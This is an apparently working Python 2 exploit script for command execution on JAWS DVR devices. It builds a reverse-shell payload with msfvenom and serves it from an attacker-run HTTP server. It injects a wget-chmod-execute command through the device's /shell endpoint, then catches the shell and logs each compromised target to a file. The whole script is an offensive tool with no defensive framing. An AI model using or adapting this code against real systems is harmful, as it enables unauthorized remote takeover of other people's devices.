#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-
# recives request back...now to figure out how to make it urlencode
import requests as rq
from pwn import *
import sys
import thread
import urllib
from time import sleep
import uuid
import os
#def handler():
 #print "TESTUP"

def banner():
    print """\033[1;38m
  ▄▄▄██▀▀▀▄▄▄       █     █░  ██████ 
   ▒██  ▒████▄    ▓█░ █ ░█░▒██    ▒ 
   ░██  ▒██  ▀█▄  ▒█░ █ ░█ ░ ▓██▄   
▓██▄██▓ ░██▄▄▄▄██ ░█░ █ ░█   ▒   ██▒
 ▓███▒   ▓█   ▓██▒░░██▒██▓ ▒██████▒▒
 ▒▓▒▒░   ▒▒   ▓▒█░░ ▓░▒ ▒  ▒ ▒▓▒ ▒ ░
 ▒ ░▒░    ▒   ▒▒ ░  ▒ ░ ░  ░ ░▒  ░ ░
 ░ ░ ░    ░   ▒     ░   ░  ░  ░  ░  
 ░   ░        ░  ░    ░          ░\033[1;m
     \033[1;37mJAWS DVR COMMAND EXECUTION\033[1;m"""
def handler(target, host, shellport, webport):
 banner()
 log.info("Generating payload..")
 payload = subprocess.Popen(['msfvenom', '-p', 'linux/armle/shell_reverse_tcp', 'LHOST={}'.format(host), 'LPORT={}'.format(shellport), '-f', 'elf', '-o', 'payload.bin'], stdout=subprocess.PIPE).communicate()[0]
 log.info("Payload generated successfully")
 #url = urllib.quote_plus("http://{}:{}/payload.bin".format(host, webport))
 #url = "http%3A%2F%2F45.77.118.223%3A3533%2Fpayload.bin" test two
 url = "http://{}:{}/payload.bin".format(host, webport)
 cmd = "wget {} -qO /tmp/payload.bin;sleep 1;chmod +x /tmp/payload.bin;/tmp/payload.bin;rm -rf payload.bin".format(url)
 cmd = urllib.quote_plus(cmd)
 web_thread = threading.Thread(target=webserver, args=(host, webport))
 web_thread.daemon = True
 web_thread.start()
 exploit_thread = threading.Thread(target=exploit, args=(target, cmd))
 exploit_thread.daemon = True
 exploit_thread.start()
 try:
  l = listen(shellport)
  l.wait_for_connection()
  l.send("rm -rf /tmp/payload.bin\n")
  target = str(target)
  target = target.replace(':', '_')
  f = open("../../vulns/jaws_dvr_cmd_exec.txt", 'r')
  file = f.read()
  if target not in file:
   os.system("echo \"" + target + "\" >> ../../vulns/jaws_dvr_cmd_exec.txt")
  l.interactive(pwnlib.term.init())
  #l.interactive(prompt = pwnlib.term.text.bold_white('root:~#') + ' ')
 except KeyboardInterrupt:
  log.warning("Exiting!")
  pass
def exploit(target, cmd):
 import urllib
 log.info("Sending request..")
 req = rq.get("http://{}/shell?{}".format(target, cmd))
 if req.status_code == 200:
  log.success("Request sent successfully!")
 else: log.warning("Target not vulnerable"); sys.exit()
def webserver(host, port):
 import BaseHTTPServer
 from SimpleHTTPServer import SimpleHTTPRequestHandler
 HandlerClass = SimpleHTTPRequestHandler
 ServerClass = BaseHTTPServer.HTTPServer
 Protocol = "HTTP/1.0"
 port = int(port)
 server_address = (host, port)
 HandlerClass.protcol_version = Protocol
 httpd = ServerClass(server_address, HandlerClass)
 sa = httpd.socket.getsockname()
 log.info("HTTP Server started")
 httpd.serve_forever()
try:
 handler(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
except IndexError:
 print "Usage: target:port chost cport webport"

